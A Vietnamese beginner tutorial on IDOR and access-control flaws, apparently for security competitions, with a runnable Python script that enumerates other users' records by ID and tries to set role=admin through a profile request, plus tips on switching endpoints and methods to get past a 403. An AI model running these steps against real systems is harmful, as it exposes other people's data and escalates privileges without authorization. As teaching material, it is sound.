# IDOR / Access Control (không kiểm tra quyền sở hữu)

Hãy tưởng tượng bạn đăng nhập vào 1 app ngân hàng, xem đơn hàng của mình ở địa chỉ `/api/orders/43`. Nếu bạn đổi số `43` thành `44` và server vẫn trả về đơn hàng số 44 (của người khác) mà không hỏi "đây có phải đơn hàng của bạn không?" — đó là lỗi IDOR (viết tắt của "tham chiếu trực tiếp tới đối tượng không kiểm tra" — hiểu đơn giản là server tin luôn số ID bạn gửi lên, không kiểm tra xem bạn có quyền xem nó không). Access Control (kiểm soát quyền truy cập) nói chung rộng hơn: bất kỳ chỗ nào server quên kiểm tra "người gửi request này có được phép làm việc này không" đều tính vào đây, không chỉ riêng số ID.

Trên Burp bạn nhận ra lỗi này khi: đăng nhập bằng 1 tài khoản thường, đổi 1 số ID/username trong URL hoặc body sang giá trị của người khác, và response vẫn trả 200 kèm dữ liệu thật (không phải 403/404) — nghĩa là server không kiểm tra chủ sở hữu, chỉ cần bạn đăng nhập là đọc được dữ liệu của bất kỳ ai.

## Snippet copy-là-chạy

```python
import requests

base = "http://target"
s = requests.Session()
s.verify = False

def solve_one(session, base_url):
    # Bước 1: đăng nhập bằng tài khoản thường (không cần quyền admin)
    r0 = session.post(
        f"{base_url}/login",
        data={"username": "user", "password": "pass"},
        timeout=5,
    )
    if r0.status_code not in (200, 302):
        return None  # login sai thì dừng ngay, không đoán mò

    # Bước 2: thử đổi ID sang của người khác -- đây chính là bước "IDOR"
    # Thử vài giá trị quen thuộc: số nhỏ (user đầu tiên), số gần mình, số lớn (admin/test account)
    for uid in [1, 2, 3, 100]:
        r = session.get(f"{base_url}/api/users/{uid}", timeout=5)
        # nếu server trả 200 (không chặn) và có field nhạy cảm như "email" -- là dấu hiệu IDOR
        if r.status_code == 200 and "email" in r.text:
            print("DÍNH IDOR, user id =", uid)
            print(r.text[:300])

    # Bước 3: ngoài đổi ID trong URL, thử đổi field quyền trong body JSON -- cũng là 1 dạng Access Control
    r3 = session.post(f"{base_url}/api/profile", json={"id": 1, "role": "admin"}, timeout=5)
    print("thử set role=admin ->", r3.status_code, r3.text[:200])
    return r3.text


if __name__ == "__main__":
    print(solve_one(s, base))
```

## Giải thích cho người mới

- Bước 1 chỉ là login bình thường để có session (phiên đăng nhập) — giống cách bạn login tay trên Burp trước khi test IDOR, vì phải "là ai đó" trước thì mới có ý nghĩa test "có đọc được của người khác không".
- Vòng `for uid in [1, 2, 3, 100]`: thay vì tay đổi số trong Burp Repeater từng lần, code tự đổi `uid` và gửi lại request — đây đúng là việc bạn vẫn làm tay, chỉ là tự động hoá lặp qua nhiều giá trị.
- Điều kiện `r.status_code == 200 and "email" in r.text`: kiểm tra 2 thứ cùng lúc — (1) server không chặn (không trả 403), và (2) response thật sự có dữ liệu nhạy cảm (ở đây giả sử app có field `email` trong JSON trả về). Chỉ cần 1 trong 2 sai thì không tính là dính.
- Bước 3 là ví dụ khác của Access Control: không đổi ID trong URL mà đổi field `"role": "admin"` ngay trong body gửi lên — nếu server tin luôn giá trị này (không tự lấy role thật từ database theo session) thì bạn đã tự nâng quyền cho chính mình mà server không hay biết.

## Lưu ý nhanh

- Luôn thử gửi request y hệt bằng session của **chính mình**, so response giữa "ID của mình" và "ID của người khác" — nếu 2 response giống cấu trúc và đều trả dữ liệu thật, đó là IDOR.
- IDOR có thể nằm ở URL (`/orders/43`), ở query (`?id=43`), ở body JSON (`{"id":43}`), hoặc thậm chí trong cookie — xem đúng chỗ Burp đã gửi để sửa đúng chỗ đó.
- 403 ở 1 endpoint không có nghĩa là an toàn hoàn toàn — thử thêm endpoint tương đương (ví dụ `/api/v1/users/43` thay vì `/api/users/43`) hoặc đổi method (GET thành POST/PUT), nhưng đừng dò quá nhiều gây ồn trong thi đấu.
- Chỉ dùng trên hệ thống được phép (máy chủ của đội mình/đối phương trong phạm vi thi đấu).
